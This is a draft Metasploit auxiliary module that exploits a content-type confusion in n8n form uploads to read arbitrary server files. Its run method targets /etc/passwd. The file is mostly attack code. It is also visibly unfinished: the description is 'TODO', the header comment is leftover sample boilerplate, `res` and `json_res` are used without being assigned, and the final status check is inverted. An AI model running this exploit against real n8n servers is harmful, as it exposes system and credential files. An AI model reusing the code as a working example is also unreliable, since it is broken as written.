##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This sample auxiliary module simply displays the selected action and
# registers a custom command that will show up when the module is used.
#
###
class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'n8n arbitrary file read',
        'Description' => 'TODO',
        'Author' => [
          'dor attias', # research
          'msutovsky-r7' # module
        ],
        'License' => MSF_LICENSE,
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options([
      OptString.new('FORM_URI', [true, 'n8n form URI', ''])
    ])
  end

  def content_type_confusion_upload(filename)
    json_data = {
      files: {
        "field-0":
        {
          filepath: filename,
          originalFilename: 'product.pdf',
          mimeType: 'text/plain',
          extenstion: ''
        }
      },
      data: [
        'not really important'
      ],
      executionId: 'not really important'
    }
    send_request_cgi({
      'uri' => normalize_uri(datastore['FORM_URI']),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => json_data.to_json
    })

    fail_with(Failure::UnexpectedReply, 'Received unexpected response') unless res&.code == 200

    res.get_json_document

    fail_with(Failure::PayloadFailed, 'Failed to load target file') unless json_res['status'] != 200
  end

  def run
    content_type_confusion_upload('/etc/passwd')
  end

end
